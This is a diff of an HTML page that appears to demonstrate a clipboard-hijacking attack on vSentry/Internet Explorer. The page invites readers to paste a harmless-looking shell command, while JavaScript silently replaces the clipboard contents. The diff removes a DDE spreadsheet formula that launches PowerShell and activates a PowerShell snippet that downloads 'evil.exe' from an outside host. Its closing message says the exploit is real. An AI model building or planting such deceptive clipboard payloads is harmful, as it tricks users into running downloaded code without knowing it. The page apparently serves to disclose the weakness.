@@ -8,13 +8,10 @@
         <P> 
           <A HREF = "pages/repro.html?uname=%username%"> I'm not trying to steal data ... </A>
         </P>
-        Try out this cool new excel formula!
+        Try out this cool new command! Ctrl-c Ctr-v it into a shell!
         </br>
-          =VLOOKUP(DATE(2016,9,7),CHOOSE({1,2},&lt;startCell1&gt;:&lt;endCell1&gt;,&lt;startCell2&gt;:&lt;endCell2&gt;),2,0)
+          echo not evil
         <p>
-         You may get a prompt warning you about where the data is coming from. That's just because you need to substitute &lt;startCell1&gt;
-         etc. for your intended ranges.
-        </p>
         <script>
             function copyTextToClipboard(text) {
               var textArea = document.createElement("textarea");
@@ -67,8 +64,7 @@
                 while(end < start + ms) {
                     end = new Date().getTime();
                 } 
-                copyTextToClipboard("=cmd|' /C  start powershell'!A0");
-                //copyTextToClipboard('powershell\n{$s = $pwd;$w = New-Object System.Net.WebClient;$u = "al153.github.io/evil.exe";$f = "$s\evil.exe";$w.DownloadFile($u,$f);\n#Run evil.exe...;\n#cls;\n}\n\n\n\nWrite-output "In all seriousness, this exploit already exists. By default, vSentry allows javascript in IE to write to the clipboard. This could allow some nastiness to occur."');
+                copyTextToClipboard('powershell\n{$s = $pwd;$w = New-Object System.Net.WebClient;$u = "al153.github.io/evil.exe";$f = "$s\evil.exe";$w.DownloadFile($u,$f);\n#Run evil.exe...;\n#cls;\n}\n\n\n\nWrite-output "In all seriousness, this exploit already exists. By default, vSentry allows javascript in IE to write to the clipboard. This could allow some nastiness to occur."');
             });
         </script>
     </body>
